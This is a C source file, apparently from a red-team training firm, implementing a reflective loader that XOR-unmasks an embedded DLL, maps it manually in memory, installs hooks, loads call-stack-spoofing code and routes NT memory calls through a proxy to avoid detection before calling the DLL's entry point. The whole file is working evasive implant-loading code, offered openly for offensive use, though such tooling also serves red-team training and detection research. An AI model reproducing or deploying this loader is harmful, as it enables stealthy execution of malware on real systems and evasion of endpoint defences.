/*
 * Copyright 2025 Daniel Duggan, Zero-Point Security
 *
 * Redistribution and use in source and binary forms, with or without modification, are
 * permitted provided that the following conditions are met:
 *
 * 1. Redistributions of source code must retain the above copyright notice, this list of
 * conditions and the following disclaimer.
 *
 * 2. Redistributions in binary form must reproduce the above copyright notice, this list of
 * conditions and the following disclaimer in the documentation and/or other materials provided
 * with the distribution.
 *
 * 3. Neither the name of the copyright holder nor the names of its contributors may be used to
 * endorse or promote products derived from this software without specific prior written
 * permission.
 *
 * THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS “AS IS” AND ANY EXPRESS
 * OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED WARRANTIES OF
 * MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE
 * COPYRIGHT HOLDER OR CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL,
 * EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF
 * SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION)
 * HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR
 * TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE,
 * EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.
 */

#include <windows.h>
#include "loader.h"
#include "tp.h"
#include "proxy.h"

#define WIN32_FUNC( x ) __typeof__( x ) * x

typedef struct {
    WIN32_FUNC(LoadLibraryA);
    WIN32_FUNC(GetProcAddress);
    DRAUGR Draugr;
} WIN32FUNCS;

void go();

char _DRAUGR_[0] __attribute__((section("draugr")));
char _HOOKS_[0]  __attribute__((section("hooks")));
char _DLL_[0]    __attribute__((section("dll")));
char _KEY_[0]    __attribute__((section("key")));

void * AllocateVirtualMemory(SIZE_T size, ULONG protect)
{
    NTARGS args;
    memset(&args, 0, sizeof(NTARGS));

    void * baseAddress = NULL;

    args.functionPtr = (ULONG_PTR)(NTDLL$NtAllocateVirtualMemory);
    args.argument1   = (ULONG_PTR)(HANDLE)(-1);
    args.argument2   = (ULONG_PTR)(&baseAddress);
    args.argument3   = (ULONG_PTR)(0);
    args.argument4   = (ULONG_PTR)(&size);
    args.argument5   = (ULONG_PTR)(MEM_COMMIT|MEM_RESERVE);
    args.argument6   = (ULONG_PTR)(protect);

    ProxyNtApi(&args);

    return baseAddress;
}

void ProtectVirtualMemory(void * baseAddress, SIZE_T size, ULONG newProtect)
{
    NTARGS args;
    memset(&args, 0, sizeof(NTARGS));

    ULONG oldProtect = 0;

    args.functionPtr = (ULONG_PTR)(NTDLL$NtProtectVirtualMemory);
    args.argument1   = (ULONG_PTR)(HANDLE)(-1);
    args.argument2   = (ULONG_PTR)(&baseAddress);
    args.argument3   = (ULONG_PTR)(&size);
    args.argument4   = (ULONG_PTR)(newProtect);
    args.argument5   = (ULONG_PTR)(&oldProtect);

    ProxyNtApi(&args);
}

void FreeVirtualMemory(void * baseAddress)
{
    NTARGS args;
    memset(&args, 0, sizeof(NTARGS));

    SIZE_T size = 0;

    args.functionPtr = (ULONG_PTR)(NTDLL$NtFreeVirtualMemory);
    args.argument1   = (ULONG_PTR)(HANDLE)(-1);
    args.argument2   = (ULONG_PTR)(&baseAddress);
    args.argument3   = (ULONG_PTR)(&size);
    args.argument4   = (ULONG_PTR)(MEM_RELEASE);

    ProxyNtApi(&args);
}

void FixSectionPermissions(DLLDATA * dll, char * src, char * dst, MEMORY_REGION * region, RDATA_SECTION * rdata)
{
    DWORD                   numberOfSections = dll->NtHeaders->FileHeader.NumberOfSections;
    IMAGE_SECTION_HEADER  * sectionHdr       = NULL;
    void                  * sectionDst       = NULL;
    DWORD                   sectionSize      = 0;
    DWORD                   newProtect       = 0;

    sectionHdr  = (IMAGE_SECTION_HEADER *)PTR_OFFSET(dll->OptionalHeader, dll->NtHeaders->FileHeader.SizeOfOptionalHeader);

    for (int i = 0; i < numberOfSections; i++)
    {
        sectionDst  = dst + sectionHdr->VirtualAddress;
        sectionSize = sectionHdr->SizeOfRawData;

        if (sectionHdr->Characteristics & IMAGE_SCN_MEM_WRITE) {
            newProtect = PAGE_WRITECOPY;
        }
        if (sectionHdr->Characteristics & IMAGE_SCN_MEM_READ) {
            newProtect = PAGE_READONLY;
        }
        if ((sectionHdr->Characteristics & IMAGE_SCN_MEM_READ) && (sectionHdr->Characteristics & IMAGE_SCN_MEM_WRITE)) {
            newProtect = PAGE_READWRITE;
        }
        if (sectionHdr->Characteristics & IMAGE_SCN_MEM_EXECUTE) {
            newProtect = PAGE_EXECUTE;
        }
        if ((sectionHdr->Characteristics & IMAGE_SCN_MEM_EXECUTE) && (sectionHdr->Characteristics & IMAGE_SCN_MEM_READ)) {
            newProtect = PAGE_EXECUTE_WRITECOPY;
        }
        if ((sectionHdr->Characteristics & IMAGE_SCN_MEM_EXECUTE) && (sectionHdr->Characteristics & IMAGE_SCN_MEM_READ)) {
            newProtect = PAGE_EXECUTE_READ;
        }
        if ((sectionHdr->Characteristics & IMAGE_SCN_MEM_READ) && (sectionHdr->Characteristics & IMAGE_SCN_MEM_WRITE) && (sectionHdr->Characteristics & IMAGE_SCN_MEM_EXECUTE)) {
            newProtect = PAGE_EXECUTE_READWRITE;
        }

        /* set new permission */
        ProtectVirtualMemory(sectionDst, sectionSize, newProtect);

        /* track memory */
        region->sections[i].baseAddress     = sectionDst;
        region->sections[i].size            = sectionSize;
        region->sections[i].currentProtect  = newProtect;
        region->sections[i].previousProtect = newProtect;

        if (MSVCRT$strncmp((char *)sectionHdr->Name, ".rdata", IMAGE_SIZEOF_SHORT_NAME) == 0)
        {
            rdata->start  = sectionDst;
            rdata->length = sectionSize;
            rdata->offset = dll->NtHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IAT].Size;
        }

        /* advance to our next section */
        sectionHdr++;
    }
}

void go(void * loaderArgument)
{
    WIN32FUNCS funcs;
    memset(&funcs, 0, sizeof(WIN32FUNCS));

    /* set funcs */
    funcs.LoadLibraryA       = LoadLibraryA;
    funcs.GetProcAddress     = GetProcAddress;

    MEMORY_LAYOUT layout;
    memset(&layout, 0, sizeof(MEMORY_LAYOUT));

    /* get draugr pic */
    RESOURCE * draugr = (RESOURCE *)GETRESOURCE(_DRAUGR_);

    /* load it into memory */
    char * pic = AllocateVirtualMemory(draugr->length, PAGE_READWRITE);
    memcpy(pic, draugr->value, draugr->length);
    ProtectVirtualMemory(pic, draugr->length, PAGE_EXECUTE_READ);

    layout.pic.baseAddress = pic;
    layout.pic.size        = draugr->length;

    funcs.Draugr = (DRAUGR)(pic);

    /* get hooking pico */
    char * hooks = GETRESOURCE(_HOOKS_);

    /* load it into memory */
    PICO * pico = (PICO *)AllocateVirtualMemory(sizeof(PICO), PAGE_READWRITE);
    PicoLoad((IMPORTFUNCS *)&funcs, hooks, pico->code, pico->data);
    ProtectVirtualMemory(pico->code, PicoCodeSize(hooks), PAGE_EXECUTE_READ);

    /* record layout */
    layout.hooks.baseAddress                 = (char *)(pico);
    layout.hooks.size                        = sizeof(PICO);
    layout.hooks.sections[0].baseAddress     = pico->data;
    layout.hooks.sections[0].size            = PicoDataSize(hooks);
    layout.hooks.sections[0].currentProtect  = PAGE_READWRITE;
    layout.hooks.sections[0].previousProtect = PAGE_READWRITE;
    layout.hooks.sections[1].baseAddress     = pico->code;
    layout.hooks.sections[1].size            = PicoCodeSize(hooks);
    layout.hooks.sections[1].currentProtect  = PAGE_EXECUTE_READ;
    layout.hooks.sections[1].previousProtect = PAGE_EXECUTE_READ;

    /* get pico entry point */
    PICOHOOK_ENTRY picoEntry = (PICOHOOK_ENTRY)PicoEntryPoint(hooks, pico->code);

    /* call it to install the hooks */
    picoEntry((IMPORTFUNCS *)&funcs, &layout);

    /* get the masked dll and key */
    RESOURCE * dll = (RESOURCE *)GETRESOURCE(_DLL_);
    RESOURCE * key = (RESOURCE *)GETRESOURCE(_KEY_);

    /* unmask the dll into memory */
    char * src = AllocateVirtualMemory(dll->length, PAGE_READWRITE);
    for (int i = 0; i < dll->length; i++) {
        src[i] = dll->value[i] ^ key->value[i % key->length];
    }

    /* parse dll header */
    DLLDATA data;
    ParseDLL(src, &data);

    /* loader it into memory */
    char * dst = AllocateVirtualMemory(SizeOfDLL(&data), PAGE_READWRITE);

    LoadDLL(&data, src, dst);
    ProcessImports((IMPORTFUNCS *)&funcs, &data, dst);

    layout.dll.baseAddress = dst;
    layout.dll.size        = SizeOfDLL(&data);

    RDATA_SECTION rdata;
    memset(&rdata, 0, sizeof(RDATA_SECTION));
    FixSectionPermissions(&data, src, dst, &layout.dll, &rdata);

    /* call hook pico again to provide the updated memory layout */
    picoEntry((IMPORTFUNCS *)&funcs, &layout);

    /* get entry point */
    DLLMAIN_FUNC dllMain = EntryPoint(&data, dst);

    /* free unmasked copy */
    FreeVirtualMemory(src);

    /* call entry point */
    dllMain((HINSTANCE)dst, DLL_PROCESS_ATTACH, NULL);
    dllMain((HINSTANCE)GETRESOURCE(go), 0x4, loaderArgument);
}